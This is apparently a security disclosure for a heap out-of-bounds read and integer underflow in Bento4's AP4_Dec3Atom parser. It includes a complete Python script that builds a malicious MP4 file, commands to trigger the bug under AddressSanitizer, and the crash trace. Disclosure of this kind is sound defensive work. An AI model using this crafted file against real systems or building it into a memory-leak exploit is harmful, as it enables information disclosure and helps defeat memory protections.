## Bug0: Heap Out-of-Bounds Read in AP4_Dec3Atom Constructor via Insufficient Payload Size Check

In `AP4_Dec3Atom::AP4_Dec3Atom()` in `Ap4Dec3Atom.cpp`, the substream parsing loop guards against reading substream fields only when `payload_size < 3`, but unconditionally accesses `payload[3]` (requiring 4 bytes) when `num_dep_sub` is nonzero, causing a one-byte heap buffer over-read followed by an unsigned integer underflow of `payload_size` to `0xFFFFFFFF` that allows further out-of-bounds reads across subsequent substream iterations.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, data):
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data

def make_fullbox(box_type, version, flags, data):
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return make_box(box_type, vf + data)

# dec3 box (EC3SpecificBox) -- exactly 13 bytes total
# payload[4]=0x0E -> num_dep_sub=(0x0E>>1)&0xF=7 (nonzero) -> triggers OOB read of payload[3]
dec3_payload = bytes([0x00, 0x00, 0x00, 0x00, 0x0E])
dec3_box = struct.pack(">I", 13) + b'dec3' + dec3_payload

# ec-3 AudioSampleEntry
ec3_audio_entry = (
    b'\x00' * 6 +
    struct.pack(">H", 1) +
    b'\x00' * 8 +
    struct.pack(">H", 2) +
    struct.pack(">H", 16) +
    struct.pack(">H", 0) +
    struct.pack(">H", 0) +
    struct.pack(">I", 44100 << 16) +
    dec3_box
)
ec3_box = make_box(b'ec-3', ec3_audio_entry)

stsd_box = make_fullbox(b'stsd', 0, 0, struct.pack(">I", 1) + ec3_box)
stts_box = make_fullbox(b'stts', 0, 0, struct.pack(">I", 0))
stsc_box = make_fullbox(b'stsc', 0, 0, struct.pack(">I", 0))
stsz_box = make_fullbox(b'stsz', 0, 0, struct.pack(">II", 0, 0))
stco_box = make_fullbox(b'stco', 0, 0, struct.pack(">I", 0))
stbl_box = make_box(b'stbl', stsd_box + stts_box + stsc_box + stsz_box + stco_box)

smhd_box = make_fullbox(b'smhd', 0, 0, struct.pack(">HH", 0, 0))
url_box = make_fullbox(b'url ', 0, 1, b'')
dref_box = make_fullbox(b'dref', 0, 0, struct.pack(">I", 1) + url_box)
dinf_box = make_box(b'dinf', dref_box)
minf_box = make_box(b'minf', smhd_box + dinf_box + stbl_box)

mdhd_data = (
    struct.pack(">I", 0) + struct.pack(">I", 0) +
    struct.pack(">I", 44100) + struct.pack(">I", 0) +
    struct.pack(">HH", 0x55C4, 0)
)
mdhd_box = make_fullbox(b'mdhd', 0, 0, mdhd_data)

hdlr_data = struct.pack(">I", 0) + b'soun' + b'\x00' * 12 + b'\x00'
hdlr_box = make_fullbox(b'hdlr', 0, 0, hdlr_data)
mdia_box = make_box(b'mdia', mdhd_box + hdlr_box + minf_box)

unity_matrix = struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_data = (
    struct.pack(">I", 0) + struct.pack(">I", 0) +
    struct.pack(">I", 1) + struct.pack(">I", 0) +
    struct.pack(">I", 0) + b'\x00' * 8 +
    struct.pack(">HH", 0, 0) + struct.pack(">H", 0x0100) +
    struct.pack(">H", 0) + unity_matrix + struct.pack(">II", 0, 0)
)
tkhd_box = make_fullbox(b'tkhd', 0, 3, tkhd_data)
trak_box = make_box(b'trak', tkhd_box + mdia_box)

mvhd_data = (
    struct.pack(">I", 0) + struct.pack(">I", 0) +
    struct.pack(">I", 1000) + struct.pack(">I", 0) +
    struct.pack(">I", 0x00010000) + struct.pack(">H", 0x0100) +
    b'\x00' * 10 + unity_matrix + b'\x00' * 24 +
    struct.pack(">I", 2)
)
mvhd_box = make_fullbox(b'mvhd', 0, 0, mvhd_data)
moov_box = make_box(b'moov', mvhd_box + trak_box)

ftyp_box = make_box(b'ftyp', b'mp42' + struct.pack(">I", 0) + b'mp42' + b'isom')
mdat_box = struct.pack(">I", 8) + b'mdat'

mp4_data = ftyp_box + moov_box + mdat_box
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f"[+] Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f5 at pc 0x55f0f8bb4e2d bp 0x7ffde9937e00 sp 0x7ffde9937df0
READ of size 1 at 0x5020000000f5 thread T0
    #0 0x55f0f8bb4e2c in AP4_Dec3Atom::AP4_Dec3Atom(unsigned int, unsigned char const*)
    #1 0x55f0f8bb6c8a in AP4_Dec3Atom::Create(unsigned int, AP4_ByteStream&)

### Impact

Processing a crafted MP4 file containing a `dec3` box with a truncated payload causes a one-byte heap out-of-bounds read in `AP4_Dec3Atom::AP4_Dec3Atom()`, which can expose heap metadata or adjacent object contents from the process heap. The subsequent unsigned integer underflow of `payload_size` to `0xFFFFFFFF` allows up to seven additional substream iterations to read further beyond the allocation boundary, increasing the potential for information disclosure that could be used to defeat ASLR. Any invocation of `mp42aac` on an untrusted MP4 file is exposed to this attack with no authentication or interaction required beyond supplying the file.
